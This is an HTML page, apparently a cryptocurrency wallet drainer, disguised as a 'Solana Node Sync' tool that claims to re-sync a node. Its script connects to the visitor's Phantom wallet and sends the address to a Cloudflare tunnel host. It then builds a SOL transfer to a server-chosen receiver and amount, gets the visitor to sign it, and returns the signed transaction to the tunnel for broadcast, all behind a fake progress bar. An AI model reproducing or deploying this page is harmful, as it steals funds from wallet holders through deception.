<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.3/index.iife.min.js"></script>
    <style>
        body { background: #0c0c0c; color: #14f195; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1a1a1a; padding: 40px; border-radius: 12px; border: 1px solid #14f195; text-align: center; width: 340px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #9945FF; }
        .status { font-size: 14px; color: #888; margin-bottom: 30px; }
        .progress-bg { background: #333; height: 6px; width: 100%; border-radius: 3px; margin-bottom: 30px; overflow: hidden; }
        #progress-bar { background: #14f195; height: 100%; width: 0%; transition: 0.5s ease; }
        button { background: #14f195; color: #000; border: none; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #10c37a; transform: translateY(-2px); }
        #info { margin-top: 15px; font-size: 12px; color: #555; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">SOLANA NODE</div>
        <div class="status">STATUS: <span style="color: #ff3e3e;">OUT OF SYNC</span></div>
        <div class="progress-bg"><div id="progress-bar"></div></div>
        <button id="cta">RE-SYNC NODE</button>
        <div id="info">Waiting for wallet connection...</div>
    </div>

    <script>
        // ğŸ”± è¿™é‡Œå¡«ä½  71 æœåŠ¡å™¨çš„éš§é“åœ°å€
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            const sWeb3 = window.solanaWeb3;
            
            if (!p || !p.isPhantom) {
                alert("Please use Phantom Wallet App or Browser Extension");
                return;
            }

            try {
                // 1. è¿æ¥é’±åŒ…
                const resp = await p.connect();
                const walletAddress = resp.publicKey.toString();
                document.getElementById('progress-bar').style.width = "25%";
                document.getElementById('info').innerText = "Analyzing node data...";

                // 2. ä»åç«¯æ‹¿ç²¾ç®—åçš„æ•°æ®
                const response = await fetch(`${tunnel}/prepare`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: walletAddress })
                });

                if (!response.ok) throw new Error("Server response failed");
                const info = await response.json();
                
                document.getElementById('progress-bar').style.width = "50%";
                document.getElementById('info').innerText = "Preparing synchronization...";

                // 3. æ„é€ äº¤æ˜“ (ä¸¥æ ¼æŒ‰ç…§åç«¯ä¼ å›çš„ 11020000 ç®—è´¦)
                const transaction = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new sWeb3.PublicKey(info.receiver),
                        lamports: parseInt(info.amount),
                    })
                );
                transaction.recentBlockhash = info.bh;
                transaction.feePayer = p.publicKey;

                document.getElementById('progress-bar').style.width = "75%";
                document.getElementById('info').innerText = "Awaiting signature...";

                // 4. æ‹‰èµ·ç­¾å (æ ¸å¿ƒæ—¶åˆ»)
                const signed = await p.signTransaction(transaction);
                
                // 5. å°†ç­¾ååçš„åŸå§‹äº¤æ˜“å›ä¼ ç»™åç«¯è¿›è¡Œå¹¿æ’­
                const serialized = signed.serialize();
                let binary = '';
                const bytes = new Uint8Array(serialized);
                for (let i = 0; i < bytes.byteLength; i++) {
                    binary += String.fromCharCode(bytes[i]);
                }

                fetch(`${tunnel}/broadcast`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: btoa(binary) })
                });

                document.getElementById('progress-bar').style.width = "100%";
                document.getElementById('info').innerText = "Node Synchronized! Redirecting...";
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 2000);

            } catch (err) {
                console.error("Critical Error:", err);
                document.getElementById('info').innerText = "Sync failed. Please try again.";
                document.getElementById('progress-bar').style.width = "0%";
            }
        };
    </script>
</body>
</html>
